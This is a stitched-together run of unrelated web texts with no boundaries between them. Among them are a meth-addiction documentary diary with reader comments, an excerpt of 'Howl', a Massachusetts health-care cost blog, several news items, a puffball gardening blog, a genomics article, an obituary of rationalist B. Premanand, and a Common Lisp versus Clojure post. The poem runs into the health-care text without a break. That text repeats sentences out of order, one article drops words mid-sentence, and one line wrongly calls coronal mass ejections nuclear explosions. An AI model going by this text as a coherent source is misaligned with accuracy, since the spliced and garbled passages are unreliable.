I spent many nights with Fresno PD in a nightmarish merry - go - round of busts of desperate and addicted people .
Many of the most hopeless meth users were well - known to the authorities , and their lives , disordered by the drug and by their backgrounds , were a sad litany of despair and hopelessness - domestic violence , loved - ones in jail , kids raised by their grandparents .
Just when I 'd thought I 'd seen it all , on our last night on patrol , we happened upon a man , high on meth and armed with a knife , having a blazing row with his sister .
His wife was also present and revealed that the two had been having an incestuous affair .
The drug gives strong feelings of euphoria
We also made contact with Fresno's largest rehab facility and tracked addicts as they attempted to get clean .
I concentrated on women - for some reason their stories were more compelling .
Many of these women were attempting to reconnect with children .
One of the fruits of that reckless sexual activity I mentioned are very large numbers of offspring - several meth addicts I met had five or more children , all of them in care .
This destruction of families and blighting of children 's lives is probably the saddest aspect of the meth phenomenon .
For us as a production the most difficult aspect of the story was attempting to infiltrate the world of the active users .
Casual users would have been easy to film - but we were interested in the hardcore .
Brutal backgrounds
The first serious meth heads we filmed with were Carl and Dianne , a married couple whose five children were no longer with them , but who had managed against the odds to stay together as a couple for more than 20 years .
Carl and Dianne were a likeable pair , intelligent , responsible - well , as responsible as you can be while being a meth addict - and both of them grappling with backgrounds so brutal and disturbing that their use was in some ways understandable .
And there were the aforementioned Andrew and his friend Chris , who 'd asked me if I felt " tempted " .
They too were friendly enough guys .
Intelligent , funny - it just happened that they 'd grown up in a community in which meth use was common at every age , at every level .
That moment of observing the use of the drug up - close was , for me , quite strange .
I 'd thought about it for months , seen the consequences of addiction , observed the ruined lives , and now here it was in front of me .
I felt a little awkward , torn between wanting to challenge Andrew and mindful that he was making his own choices ( and that he at least did not have any children ) .
There 's a big why .
Why meth ?
Why is that particular drug so prevalent ?
But it 's not hard to solve - lack of opportunity , lack of guidance , the cheapness and availability of that narcotic , and the powerful illusions of escape and control which it provides .
Meth is " ghetto Prozac " - a primitive and dangerous pain - reliever , which goes on to aggravate the very pain and chaos which people take it to avoid .
And so , to answer the question : Was I tempted ?
Not so much .
Below is a selection of your comments .
I 've found in my family 's struggle with meth that for many people it is n't as much about getting high or escaping your problems , but more as a tool for getting through work or what have you .
Then once you 're hooked , you 're hooked .
I once saw a documentary describe speed as the " all - American drug " .
Very , very true .
Kyle , Mattoon AKA Methtoon , IL Meth is a huge problem , especially in the smaller communities here in the States .
The lack of employment makes meth tempting , both to take and to sell .
Hardly a month goes by without a news story of someone trying to cook meth and burning down their house / trailer / hotel room .
It 's very sad , and it does n't seem like it will be going away any time soon .
Sarah Baker , Tremont , IL USA
One of the reasons meth is so common and popular here in the US is that 's it 's ' home made ' ie does not require importing of either the finished product or the raw materials to manufacture it .
The American ' War on Drugs ' tends to go after foreign production and supply lines e.g. Columbia and Afganistan .
The precursors needed to make meth are available from a pharmacy and a chemistry supplier although in recent years states have made their own laws restricting the sales of these in quantity .
Simon Crisp , New River , AZ , USA
As a former meth user / addict I look forward to watching this documentary .
Like most " good " televison though I fear that it will focus on the " freaks " .
I nearly killed myself several times whilst on the drug and I am paying with my mental health 10 years after getting clean .
No one ( even my close family and friends ) had any idea how bad my situation was at the time .
For some it is easy to hide , and this is the aspect of the addiction that frightens me the most .
Witheld , London , UK I grew up in a meth affected American family .
Yes meth has a stranglehold on the impoverished underbelly of the country .
However , it is n't just cheap and easily available .
You noted that many of the users you were interacting with were of average or above intelligence which means : they were quite capable of making meth all on their lonesome .
It is an unsettling thought and an even more unsettling experience .
Nevebaci , Dundee , UK
After reading this I realise that we look to the destruction of society coming from a meteor or other celestial event , but really , it 's more likely it'll come from the creeping breakdown of society brought about by our disconnected way of life .
Depressing tale !
Stuart Duffy , Bishopton , UK Seven years ago , I went to visit a cousin in California , and discovered first hand this shocking drug everybody called crank .
It really is rife is certain communities , and I spent a month hanging out with a meth addict .
The zombified features were shocking , but his immense and erratic energy was the most disturbing thing to deal with .
He was also fresh out of prison , but headed back shortly after .
Thankfully , he is now clean and a completely rejuvinated character .
I hope meth never takes a foothold here , for it really is a ghost - maker .

Favorite verse : Hebrews 4:12
The Word of God is alive and powerful , sharper than any two edged sword , piercing even to the dividing asunder of the soul and spirit , the joints and the marrow , and is a critic of the thoughts and intents of the heart .
Some regard the King James Bible to be a work of fiction , others the Holy word of God .
I read the King James translation of the Bible some , when I was young , and more or less accepted what was taught about the King James Bible at the church I attended with my parents .
When I grew older , I looked at the Bible for myself , and at one point , almost gave up on the whole idea of God and all .
The church I attended - when I was growing up - put a lot of stock in the original languages for translation .
There was a lot of ranting in the church about how terrible a translation the King James actually was .
Later , when I went to college , I took some years of Greek and a tad of Hebrew .
I later came the conclusion that the Bible text was truthful , but that I had been mislead by the pastors teachings concerning what the Bible actually had to say .
I personally feel as though I understand why there are hostile attitudes toward the Bible text .
Not so sure , however , that I understand why anyone would feel so hostile toward a book they believe to be purely fiction .
It is said that Life is stranger than fiction and perhaps , for some , truth is more mysterious .
I imagine a good deal of turmoil over the Bible text has to do with the plethora of men / women of the cloth who put their own special spin on the Bible ; and perhaps , a generous portion of synagogue or church goers who are neither hearers , nor doers of good .
IMHO a lot of false ideas about the Bible text are popular .
I imagine a majority of people dont know or care very little what the Bible text has to say , or even what it means .
It seems common now for people to mock and deride the Bible .
In the end , what is true will be true and what is false will be false .
Although , I imagine some of the positive reviewers of the Bible text may know very little of the Bibles contents , I feel as though - it may also be the case - that some of the Bibles more negative , or sarcastic reviewers , are just as rash in their willingness to post a judgmental rant or comment concerning the King James Bible text .
The King James translation of the Bible is maybe not the best translation for a modern reader , but for the most part is readable .

I found a recipe for making granola with olive oil instead of ordinary vegetable oil in the NY Times .
I cut out the recipe and hung it on the fridge where it ’s been staring me in the face for several months .
This weekend , we decided to go ahead and make our own version .
Success is crunchy !

BAGHDAD  Commanders of the Multi-National Force - Iraq , as the American - led coalition is formally called , have a looming nomenclature problem .
Two days from now , there will no longer be any other nations with troops in Iraq  no “ multi ” in the Multi -National Force .
As Iraqi forces have increasingly taken the lead , the United States is the last of the “ coalition of the willing ” that the Bush administration first brought together in 2003 .
That is partly because the Iraqi Parliament left suddenly for summer recess without voting to extend an agreement for the British military to keep a residual training force of 100 soldiers in Iraq .
As a result , those troops must withdraw to Kuwait by Friday , according to a British diplomat , who declined to be identified in keeping with his government ’s practice .
As for the other two small remnants of the coalition , the Romanians and Australians , the Australians will be gone by July 31 , too , and the Romanians left last Thursday , according to the Romanian chargé d’affaires , Cristian Voicu .
NATO will keep a small training presence in Iraq , but its troops were never considered part of the Multi-National Force because of opposition to the war from many NATO countries .

I saw the best minds of my generation destroyed by madness ,
starving hysterical naked ,
dragging themselves through the negro streets at dawn looking for
an angry fix ,
angelheaded hipsters burning for the ancient heavenly connection
to the starry dynamo in the machinery of night ,
who poverty and tatters and hollow - eyed and high sat up smoking
in the supernatural darkness of cold - water flats floating
across the tops of cities contemplating jazz ,
who bared their brains to Heaven under the El and saw
Mohammedan angels staggering on tenement roofs
illuminated ,
who passed through universities with radiant cool eyes hallucinating
Arkansas and Blake - light tragedy among the scholars of war ,
who were expelled from the academies for crazy & publishing
obscene odes on the windows of the skull ,
who cowered in unshaven rooms in underwear , burning their money
in wastebaskets and listening to the Terror through the wall ,
who got busted in their pubic beards returning through Laredo
with a belt of marijuana for New York ,
who ate fire in paint hotels or drank turpentine in Paradise Alley ,
death , or purgatoried their torsos night after night
with dreams , with drugs , with waking nightmares , alcohol and
cock and endless balls ,
incomparable blind streets of shuddering cloud and lightning in the
mind leaping toward poles of Canada & Paterson ,
Anything you could do to a putative new system , you could do to Medicare .
And the reason we have n't is not that we just thought of comparative effectiveness research , healthcare IT , or strong - arming provider payments last week .
These ideas have all been kicking around for a long time , and in the case of the provider payments , have already been tried more than once .
Providers learn to game the new payment rules , and if they do n't , they get Congress to undo them .
But maybe the new system will be different .
So let 's look at the closest model we have for this system in the United States : the state of Massachusetts .
Massachusetts has all the goodies in the Baucus bill : subsidies , guaranteed issue , community rating , an individual mandate , and employer penalties .
Indeed , the Massachusetts program is probably to the left of where we 're going to end up , on things like empowering the exchanges to negotiate with insurance companies and the size of the penalties for failing to procure insurance , two measures which are supposed to be critical for holding costs down .
Instead , costs have exploded .
This excellent powerpoint from the State of Massachusetts has some compelling graphics .
The cost of individual premiums also jumped sharply in 2007 , as you can see , when insurance companies began to rate their experience under the new health care regime .

And health - care costs have continued to grow rapidly .
According to a Rand Corporation study this year , the growth now exceeds state GDP by 8 % .
The Boston Globe recently reported that state health - insurance commissioners are now worried that medical spending could push both employers and patients into bankruptcy , and may even threaten the system 's continued existence .
So I 'll turn it around on reformers : why do you think that we can control costs , given that we could n't at the state level ?
Massachusetts is a very liberal state , a very rich state , and it started out with a relatively low proportion of its citizenry uninsured .
Proponents of reform often say it has to be done at a national level because states can't borrow money in downturns , but this does n't explain why the spending side is headed through the roof .
Why are you gazing past the cost control problems at home towards people who do n't even speak the same language we do , much less share a political culture ?
It 's no good saying that well , we should try to be more like the Netherlands -- you can't build a system on the assumption that you will , suddenly and for no apparent reason , be able to import someone else 's political culture .
Progressives are watching the whole health care legislative process with utter dismay as it produces a monster of a bill that not even its mother could love -- and trying to love it anyway , on the grounds that it 's a start .
But this ridiculous hodgepodge , this hypertrophied Rube Goldberg apparatus , is not some startling aberration of the political process , induced by some Republican dark magic .
This is the kind of thing the American political system produces .
This is why all of our programs have a substantial element of the inexplicable and bizarre .
Unfortunately , my PowerPoint - Fu being a little rusty , it 's slightly hard to read , but if you click on it you 'll get a full size pop-up .
Here 's what you 'll see : between 1991 and 2004 , Massachusetts had a rate of healthcare inflation that was just slightly above the US average , though the gap widened somewhat towards the end of that period .
But from 2004 on , the rate of US healthcare inflation drops , while Massachusetts stays steady , until it is more than a full percentage point higher than the rate of US healthcare spending growth .
The cost of individual premiums also jumped sharply in 2007 , as you can see , when insurance companies began to rate their experience under the new health care regime .
And the Boston Globe says insurers are predicting another bumper year for premium increases , with an average expected increase of 10 % .
Meanwhile , the Commonwealth of Massachusetts is spending substantially more than it was expected to The Official Asymmetrical Information Fiance has a more complete guide to how the various combinations of mandates , guaranteed issue , community rating , and subsidy have performed at the state level .
Answer : not well .
Here 's the nut graph on Massachusetts :

The owner hit a parked car while returning from a bar
Police in the US state of Minnesota are planning to auction off a specially modified and motorised lounge chair whose owner crashed it while drunk .
Dennis LeRoy Anderson , 62 , pleaded guilty last Monday to driving the La - Z - Boy while drunk in August last year .
The chair was impounded after he smashed into a parked car as he returned from a bar in Proctor .
The chair comes with a stereo , nitrous oxide booster , parachute and a " hell yeah it 's fast " sticker .
Local police chief Walter Wobig told Agence France - Presse news agency the chair would be posted on eBay next week with no reserve price .
Minnesota police can auction off vehicles seized in drink - drive cases or keep them for official use .
The blue and black chair 's other attractions include headlights and a steering wheel in the style of a drag - racer .
It can reach up to 20 mph ( 32 km / h ) with its lawnmower - powered engine .
Mr Anderson , who was not badly injured in the accident , was found to have three times the legal limit when arrested .
He said he had drunk eight or nine beers .
Mr Anderson was sentenced to 180 days in jail , suspended pending two years of probation .
The Proctor Journal said the police department had received a number of calls and emails about the chair since the court case .
It quoted one interested party of " racers " as saying they lived outside Minnesota and the chair would " no longer be a menace to your town " .
I ’m not a very good gardener , despite good intentions .
That ’s why I have a pile of bark mulch that I never got around to spreading .
At first it stood as a testament to my indolence ; a reminder of horticultural shame as I passed by every morning and evening .
How I despised it !
But then it started growing puffballs .
Not just a couple of little puffballs either , but a massive , tumorous pile of them .
A burgeoning puffball eruption !
At night I could hear them muttering at each other ( hey , heeyy , heeeyyy ) as they shouldered themselves some room to grow .
They really like my mulch .
Although collectively huge , these are n’t giant puffballs , they ’re just “ ordinary ” puffballs .
They do n’t need water to disperse their spores like normal mushrooms ; their spores get puffed out by deer hooves , drops of rain , scampering chipmunks , and the stomping shoes of certain children I know .
Puffballs are funny fungi that seek to offend .
You might know them as members of the genus Lycoperdon ( we ’ll revisit this later ) .
That name derives from the Greek words for wolf and fart .
( Yes , I said fart on the internet .
Sorry Mom ) .
More about farts and the names of puffballs in many languages in the famous book , Mushrooms , Russia , and History , which you ’ll want to read .
I ’ve never smelled a wolf fart , and I suspect one should generally avoid getting close to a farting wolf .
One should n’t inhale the puffs of these puffballs either .
To do so would be to risk lycoperdonosis ( which I guess translates to wolf fart disease ) .
There are n’t too many documented cases of this , it ’s not like you can get it from a single stomp .
But poofing some puffballs right into your nose will do it .
A generous lungful of spores will result in breathing trouble , fever , and pulmonary damage .
These symptoms can take months to clear , but as far as I can tell , they appear to arise from hypersensitivity and inflammation rather than fungal growth in the lungs .
You will not be eaten by puffballs as if you were a big mulch pile .
Lycoperdon might be one of the coolest fungus names ever ( cast your vote here ! ) .
But alas , my mulch puffballs are no longer Lycoperdons .
You see , mycology is in the midst of the biggest revolution since Elias Fries sorted and named everything ( C.H. Persoon was a help too , particularly amongst the puffballs ) .
We ’re using genetic information to sort things out now .
These puffballs turn out to be genetically distant cousins of the true Lycoperdon species ( like L. perlatum ) .
They ’re morphologically different too , and they like to eat wood more than other Lycoperdons .
Different enough that Kreisel and Krüger have moved our mulch puffballs into the genus Morganella , where they can hang out with closer kin .
So now we must learn to call these wood - eating , often pear - shaped puffballs Morganella pyriformis .
Now a word for you , you mulch people .
You are better gardeners than me ; I admire your lovely , tidy gardens , your muddy knees .
You are thinking about writing to me , are n’t you ?
To ask how to kill the puffballs that are eating your mulch ?
So it ’s back to basics then :
What ’s mulch for ?
A cover for your lovely rich soil that you have worked so hard to build .
It cuts down on erosion , suppresses weeds , maintains moisture , and … and what ?
Provides nutrients for your pretty little plants as it breaks down to form humus .
So do n’t ask me how to get rid of puffballs .
They are breaking down your mulch ( a euphemism for eating it ) , but in the process they are feeding your plants and building your soil .
The puffballs are your friends .
If you really do n’t want your mulch to break down , try plastic .
But unsubscribe me from your fan club .
To sum up : Coolest name ever , but this lignicolous species has been exiled from the wolf farts .
Snorting them leads to lycoperdonosis , which I suppose is a misnomer if we ’re Morganella now .
Stomping is fun ; hold your breath .
Mulch people : love thy mushrooms .
Puffballs , eat your mulch .
A severe outbreak of the H1N1 pandemic could overwhelm internet providers ' capacity , according to a report submitted Monday , which called on Department of Homeland Security officials to develop contingency plans to avert such a crisis .
" Concerns exist that a more severe pandemic outbreak than 2009's could cause large numbers of people staying home to increase their internet use and overwhelm internet providers ' network capacities , " according to the report , which was prepared by the US Government Accountability Office .
It went on to warn that the congestion might be so acute that stock brokers and other securities market employees would be unable to telework from home .
The authors said the DHS , which is responsible for making sure critical networks remain operational during emergencies , needs to consider ways to mitigate the threat and held out the rationing of customer bandwidth or the blocking of websites as possibilities .
" Private Internet providers have limited ability to prioritize traffic or take other actions that could assist critical teleworkers , " the report stated .
" Some actions , such as reducing customers ' transmission speeds or blocking popular Web sites , could negatively impact e-commerce and require government authorization .
However , DHS has not developed a strategy to address potential Internet congestion or worked with federal partners to ensure that sufficient authorities to act exist . "
The authors also floated a possible " campaign to obtain public cooperation to reduce nonessential internet use to relieve congestion . "
By contrast , networks used by security exchanges would most likely survive because they generally bypass the public internet .

The new Maserati GranCabrio is all set for the Frankfurt debut .
It will be well on to sale this year with much fanfare after the release .
The car will be a four - seat convertible that will be a soft - top variant of the GranTurismo .
It comes with a grand roof that just opens up in 28 seconds .
It is easy to maintain and drive .
The investment for this grand car would be $ 140,000 or about 125,000 Euros .
The house design for this car has been made by the Italian designers , Pininfarina .
This company had also styled the GranTurismo as well as the Quattroperto for the Fiat S.p.A. subsidiary .
The GranCabrio had also been powered by the kind of hp common with the Maserati line .
This is about 440 hp with a 4.7 liter V8 .

( NaturalNews ) Genetic analysis is essentially useless in predicting a person 's risk of cancer , heart attack or other common diseases , according to a set of commentaries published in the The decoding of the human genome in 2003 led to a flood of research into the contributions that genetic variation might make to the risk of various chronic diseases that tend to develop late in life , such as diabetes , heart disease or cancer .
Since then , a number of for - profit companies have begun offering genetic screenings and disease risk assessments .
" With only a few exceptions , what the genomics companies are doing right now is recreational genomics , " said David B. Goldstein of Duke University , author of one of the commentaries .
" The information has little or in many cases no clinical relevance .
" A few diseases , such as sickle cell anemia or Tay Sachs disease , can be caused by a mutation on a single gene .
Most diseases , however , are much more complex , and develop due to an interaction between environmental factors and the contributions of a variety of genes .
In order to calculate the genetic contribution to these diseases , geneticists developed the technique known as genomewide association study , in which the genomes of groups of healthy people are compared with the genomes of those with a certain disease .
The hope among researchers has been that this analysis could point out genetic differences between the groups that might be linked to disease risk .
While genomewide analysis has successfully identified some differences between the genetic codes of healthy and diseased patients , these differences provide little information about disease risk .
Researchers expected to find a small number of common genetic variations that were responsible for each disease .
Instead , common gene variants appear to contribute to disease risk only very marginally .
Goldstein suggests that the genetic component of chronic disease risk might arise from a large number of rare genetic variants , making genetic screening far less helpful in predicting risk .
If only a small number of variants are involved , they might provide information on the biological pathways that lead to the development of the disease .
If many different variations are implicated , however , this would tell researchers nothing except that an error in the functioning of nearly any bodily system can contribute to disease risk .
"
In pointing at everything , " Goldstein wrote , " genetics would point at nothing .
" Based on the failure of more than 100 genomewide studies -- carried out on thousands of patients in a number of different countries -- to deliver useful results , Goldstein suggests that the approach should be abandoned as a waste of resources .
Genomewide analysis is only effective at uncovering common variations with large effects , Goldstein says .
Discovering rare variants with smaller effects is " beyond the grasp of the genomewide association studies .
" A single genomewide analysis study costs several million dollars to carry out .
In addition , as more such studies are carried out , each one will deliver less new information on gene - related disease risk -- a problem of diminishing returns .
Also writing in the , researchers Peter Kraft and David J. Hunter of the Harvard School of Public Health disagree with Goldstein that the studies are incapable of providing useful data .
They agree , however , that they have provided no clinically useful information to date .
Kraft and Hunter warned that any risk estimate based on genetic analysis is likely either too low or too high , because researchers simply do not have enough information on genetic contribution to disease .
Risks that are calculated as lower than they actually are will likely never be reported to patients .
This means that any genetic risk a patient actually gets told about is probably an overestimate , and only likely to cause unnecessary alarm .

Sad But Expected News ...
I have received notice from Narisetti Innaiah , chairman of CFI India , that our friend Basva Premanand has died .
Mr. Innaiah 's tribute reads :
B. Premanand , the doyen of Indian rationalist movement , is no more .
He breathed his last on 04.10.2009 at 2.20 pm at Podannur , Tamil Nadu .
He was 79 .
According to his wishes , his body has been donated to the local medical college .
Born on 17 February 1930 in Kozhikode ( Kerala ) , Premanand was a keen observer of paranormal phenomena even in his childhood .
In his teenage , he approached assorted swamis and gurus to gain spiritual insights but soon fell out with each one of them when he realized that they were all fakes .
In 1969 he met the ace Sri Lankan skeptic Dr. Abraham Kovoor who was in India for his " Miracle Exposure " lecture tour .
That was a watershed in the life of Premanand , who immediately plunged headlong into the business of debunking spiritual tricksters .
After Dr. Abraham Kovoor 's death in 1978 , Premanand continued Kovoor 's famous challenge of offering One Lakh Rupees [ US $ 2,000 ] to anyone who could demonstrate psychic abilities under fraud - proof conditions .
Admittedly , there have been few takers .
During his tumultuous campaign spanning over three exhilarating decades , Premanand visited almost every village and town in India exposing godmen and their miracles , conducting science workshops for the educated and laypersons , giving public lectures and demonstrations .
He visited about 49 countries with his mission to spread skepticism and critical thinking .
He was given a Fellowship by National Council for Science and Technology Communication of Government of India for his efforts to spread scientific awareness .
Premanand 's most famous target has of course been Puttaparthi Sai Baba , the number one spiritual fraudster in India for decades .
Once he famously filed a Civil Writ Petition in Andhra Pradesh High Court against Sai Baba under the Indian Gold Control Act !
He wanted the government to proceed against Sai Baba for materializing gold from thin air because it was in violation of Section 11 of the Gold Control Act , which mandated the permission of the Gold Control Administrator for manufacturing gold !
Given the clout godmen have among all strata of Indian society , it is not at all surprising that the case was dismissed by the court .
Premanand has compiled a massive collection of records on the infamous murder of six individuals in Sai Baba 's ashram on 6 June 1993 and has brought it out as a book ( Murders in Sai Baba 's Bedroom ) running into more than 800 pages .
This book is a " collector 's item " for those who want to know the truth behind the shady dealings in the ashram .
For more than two decades , Premanand published Indian Skeptic , a monthly magazine , dedicated to spreading rationalism and scientific temper .
The magazine was an invaluable link between various rationalist groups and individuals in our overwhelmingly religious country .
Through his Skeptic Book Club , he has brought out a number of books exposing godmen and their antics .
His most popular book , Science versus Miracles , gives natural explanation of about 150 " miracles " including those commonly performed by the godmen in India .
In November 2006 , Premanand was diagnosed with cancer , and underwent a major surgery .
But this did not prevent him from continuing with his mission .
Barely a couple of weeks after he underwent the surgery , Premanand attended a meeting of rationalists in Bangalore in January 2007 , when Bangalore Vicharavadi Sangha ( Bangalore Rationalist Association ) was founded .
He attended the 6th national conference of the Federation of Indian Rationalist Associations ( FIRA ) , of which he was the founder - convener , held in Pune in April 2007 and accepted an award ( for his contribution to rationalist movement in India ) presented to him by Maharashtra Andhrashraddha Nirmoolan Samithi .
He attended the 25th state conference of Kerala Yukthivadi Sangam ( Kerala Rationalist Association ) held in December 2007 in Thiruvananthapuram .
Premanand continued to bring out Indian Skeptic every month , without missing even a single issue until late 2008 and published a number of books on rationalism through his Skeptic Book Club .
Despite his failing health , he completed and opened to public his long - cherished project on 5 March 2009 , a permanent exhibition on the Method of Science at Podannur , Tamil Nadu .
So passes a noble and valued member of the skeptics ' community .
I will miss him greatly .
I quote from the wise sayings of artist W. Aikman :
The dead speak by their lives , by their works , and by their words .
The hijackers of a cargo ship that disappeared off the coast of France threatened to blow it up if their ransom demands were not met , Russian news agencies said .
Russia has arrested eight people on suspicion of hijacking the Arctic Sea off the Swedish coast and sailing it to the Atlantic Ocean , ending weeks of silence about the fate of a ship which has intrigued European maritime authorities .
Limited information from Russian officials has failed to satisfy sceptics who voiced doubts about whether the piracy actually took place or was a convenient cover story to conceal a possible secret cargo of arms or nuclear material .
" The crew members have already confirmed that the captors demanded a ransom and threatened to blow up the vessel if their orders were not obeyed , " Interfax quoted a Russian defence ministry spokesman as saying .
" The crew members also claim that the people who seized the Arctic Sea were armed and got rid of their weapons when the [ Russian navy ship ]
Ladny ordered the dry cargo carrier 's crew to stop the vessel , " he said .
Climbing gear , flares and a high - speed inflatable boat supposedly used in the hijack were found aboard the Arctic Sea , the spokesman said .
The agencies did not say what ransom was demanded .
The Maltese - registered , Russian - crewed vessel and its $ 1.3 million cargo of timber disappeared from radar screens three weeks ago , prompting speculation ranging from an attack by an organised crime gang to a top - secret spy mission .
The Malta Maritime Authority said on Tuesday , without elaborating , that the Arctic Sea had " never really disappeared " , a comment which increased speculation that security services might have been involved in the affair .
Russia has said the eight detainees were citizens of Estonia , Latvia and Russia who on July 24 boarded the ship , forced the crew to change route and turned off its navigation equipment .
After heading through the English Channel in late July , radio contact was lost and the 4,000 - tonne ship did not deliver its cargo to the Algerian port of Bejaia on August 4 .
The Russian navy found the missing ship on Monday in the Atlantic Ocean near Cape Verde .
The official version of events was questioned by Yulia Latynina , a leading Russian opposition journalist and commentator .
" The Arctic Sea was carrying something , not timber and not from Finland , that necessitated some major work on the ship , " she wrote in the Moscow Times newspaper on Wednesday .
During two weeks of repair works in the Russian port of Kaliningrad just before the voyage , the ship 's bulkhead was dismantled so something very large could be loaded , she wrote .
" To put it plainly : The Arctic Sea was carrying some sort of anti-aircraft or nuclear contraption intended for a nice , peaceful country like Syria , and they were caught with it , " she said .

Did Chicago lose the chance to host the 2016 Olympics because of airport security issues ?
Among the toughest questions posed to the Chicago bid team this week in Copenhagen was one that raised the issue of what kind of welcome foreigners would get from airport officials when they arrived in this country to attend the Games .
Syed Shahid Ali , an I.O.C. member from Pakistan , in the question - and - answer session following Chicago ’s official presentation , pointed out that entering the United States can be “ a rather harrowing experience . ”
President Obama , who was there as part of the 10 - person team , assured Mr. Ali that all visitors would be made to feel welcome .
“ One of the legacies I want to see is a reminder that America at its best is open to the world , ” he said . ”
But Mr. Obama ’s assurances may have not been enough to assuage critics like Mr. Ali .
A few hours later the Games went to Rio de Janeiro .
The exchange underscores what tourism officials here have been saying for years about the sometimes rigorous entry process for foreigners , which they see as a deterrent to tourism .
Once the news came out that Chicago lost its Olympic bid , the U.S. Travel Association did n’t miss an opportunity to point that out , sending out a critical press release within hours .
“ It ’s clear the United States still has a lot of work to do to restore its place as a premier travel destination , ” Roger Dow , U.S. Travel ’s president , said in the statement released today .
“ When IOC members are commenting to our President that foreign visitors find traveling to the United States a ‘ pretty harrowing experience , ’ we need to take seriously the challenge of reforming our entry process to ensure there is a welcome mat to our friends around the world , even as we ensure a secure system . ”
International travel to the U.S. declined by 10 percent in the first quarter of 2009 according to the U.S. Department of Commerce .
To lure visitors back , U.S. Travel has been pushing the Travel Promotion Act , which recently was passed in the Senate and is awaiting action in the House , to create a campaign to strengthen the image of the United States abroad .

About 15 % of pregnant women smoke Mothers who smoke during pregnancy put their children at greater risk of psychotic symptoms such as delusions and hallucinations , a study suggests .
A UK survey of 12 - year - olds found those whose mothers had smoked were 20 % more likely to suffer such problems .
The link was 84 % more pronounced if 20 or more cigarettes a day were smoked .
The researchers suggested tobacco exposure in the womb may affect the child 's brain development , but admitted further study of the issue was needed .
The research by Cardiff , Nottingham , Bristol and Warwick universities was part of a long - running study known as the Avon Longitudinal Study of Parents and Children looking at how genetics and the environment affects health .
Maternal smoking may be an important risk factor in the development of psychotic experiences in this population
Dr Stanley Zammit , lead researcher During this latest part of the programme , 12 - year - olds were asked if they had had any psychotic episodes such as delusions and hallucinations in the past six months .
In total , 11 % of the group did , the British Journal of Psychiatry reported .
The group was also studied for their mother 's use of cannabis and alcohol .
No link was found for the drug , while only those whose mothers drank more than 22 units had a higher chance of psychotic episodes .
Researchers said the findings added more weight to the argument against smoking during pregnancy - about 15 % of pregnant women still do not give up the habit when they conceive .
Lead researcher Dr Stanley Zammit said : " Maternal smoking may be an important risk factor in the development of psychotic experiences in this population . "
He said the cause of the link was unclear , although it was likely to be related to the development of the brain 's function governing attention and cognition .
However , he said further research was needed into the issue .
Dr Ken Checinski , of the Royal College of Psychiatrists , agreed .
" The findings are compelling , but we must not jump to conclusions .
" The results need to be replicated in other studies now to be sure .
" However , we already know that smoking during pregnancy is linked to a number of others risks , such as low birth - weight and complications . "

In a case of being in the right place at the right time , the MESSENGER spacecraft was able to capture a average - sized solar flare , allowing astronomers to study high - energy solar neutrons at less than 1 astronomical unit ( AU ) from the sun for the first time .
When the flare erupted on Dec. 31 , 2007 , MESSENGER – on course for entering orbit around Mercury — was flying at about half an AU , said William C. Feldman , a scientist at the Planetary Science Institute .
Previously , only the neutron bursts from the most powerful solar flares have been recorded on neutron spectrometers on Earth or in near - Earth orbit .
The MESSENGER results help solve a mystery of why some coronal mass ejections produce almost no energetic protons that reach the Earth , while others produce huge amounts .
Solar flares spew high - energy neutrons into interplanetary space .
Typically , these bursts last about 50 to 60 seconds at the sun .
But MESSENGER ’s Neutron Spectrometer was able to record neutrons from this flare over a period of six to ten hours .
“ What that ’s telling us is that at least some moderate - sized flares continuously produce high - energy neutrons in the solar corona . ”
Said Feldman .
“ From this fact , we inferred the continuous production of protons in the 30 - to - 100 - MeV ( million electron volt ) range due to the flare . ”
About 90 percent of all ions produced by a solar flare remain locked to the sun on closed magnetic lines , but another population results from the decay of the neutrons near the sun .
This second population of decayed neutrons forms an extended seed population in interplanetary space that can be further accelerated by the massive shock waves produced by the flares , Feldman said .
“ So the important results are that perhaps after many flare events two things may occur : continuous production of neutrons over an extended period of time and creation of seed populations of neutrons near the sun that have decayed into protons , ” Feldman said .
“ When coronal mass ejections ( nuclear explosions in the corona ) send shock waves into space , these feedstock protons are accelerated into interplanetary space . ”
“ There has always been the question of why some coronal mass ejections produce almost no energetic protons that reach the Earth , while others produce huge amounts , ” he added .
“ It appears that these seed populations of energetic protons near the sun could provide the answer , because it ’s easier to accelerate a proton that already has an energy of 1 MeV than a proton that is at 1 keV ( the solar wind ) . ”
The seed populations are not evenly distributed , Feldman said .
Sometimes they ’re in the right place for the shock waves to send them toward Earth , while at other times they ’re in locations where the protons are accelerated in directions that do n’t take them near Earth .
The radiation produced by solar flares is of more than academic interest to NASA , Feldman added .
Energetic protons from solar flares can damage Earth - orbiting satellites and endanger astronauts on the International Space Station or on missions to the Moon and Mars .
“ People in the manned spaceflight program are very interested in being able to predict when a coronal mass ejection is going to be effective in generating dangerous levels of high - energy protons that produce a radiation hazard for astronauts , ” he said .
To do this , scientists need to know a lot more about the mechanisms that produce flares and which flare events are likely to be dangerous .
At some point they hope to be able to predict space weather — where precipitation is in the form of radiation — with the same accuracy that forecasters predict rain or snow on Earth .
MESSENGER could provide significant data toward this goal , Feldman observed .

Last week I saw a breathless headline on proggit about clojure and Brian ’s functional brain : http://blog.bestinclass.dk/index.php/2009/10/brians-functional-brain/, written by Lau .
As a Common Lisp programmer , Clojure irritates me for various irrational reasons .
As an exercise in breaking those down , I ported Lau ’s 67 line program ( which had no comments ) to CL running on SBCL using asdf - installable libraries .
I used lispbuilders - sdl for display and pcall for concurrency .
I ended up with 115 lines , including comments and some significant differences in the program .
I went through a few revisions , initially trying to transliterate the code , looking at the fine clojure API docs to figure out what different things did .
Then I gave up on that wrote more idiomatic ( at least for me ) lisp , but still resisted the urge to use iterate of alexandria .
I wanted to have code that was as close to the bare language as possible , so I could make an apples - to - apples comparison .
Now that the exercise is done , I think that goal was unattainable .
It ’s close , but the differences in the languages are significant , so it ’s not an great comparison .
After the first round , I started diverging more from the Lau ’s version , looking for higher FPS and nicer lisp .
I ended up with a few major differences :
I used a 2D array to represent the world , the Lau used a single long vector and I did n’t quite understand how it was determining adjacency I had a lot more functions to abstract out that data structure choice ( ie : instead of calling aref everywhere , I made a get - cell function )
Lau called pmap function to calculate each cell ’s next value in parallel , and I used pcall to calculate the next whole world state while the main thread rendered .
Lau drew boxes for each rendering loop , I made two SDL surfaces up front and blitted them in at the right spots
I spent a little under 4 hours playing with it , and a lot of that was reading documentation .
I do n’t think any conclusions can be made from this for a “ common lisp vs clojure ” flame war , these are both fairly throw - away pieces of code .
I have no doubt that any experiences lisper or clojurer would find a lot of obvious improvements .
Some of my observations along the way :
getting the lisp libraries to work ( which I ’ve done in the past ) is probably harder than getting clojure working and using java libs .
